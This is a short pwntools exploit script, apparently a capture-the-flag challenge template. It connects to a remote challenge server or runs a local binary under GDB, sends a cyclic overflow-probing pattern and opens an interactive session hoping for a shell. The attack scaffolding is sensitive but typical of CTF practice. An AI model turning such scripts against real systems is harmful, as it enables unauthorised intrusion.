from pwn import *

CONN = "nc 34.124.192.13 60640"
HOST = CONN.split(" ")[1]
PORT = CONN.split(" ")[2]

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *main+128
""".format(
    **locals()
)

# Binary filename
exe = "./everything"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Send the payload
io.sendline(b"aaabaaacaaadaaaeaaafaaagaaahaaa")

# Got Shell?
io.interactive()
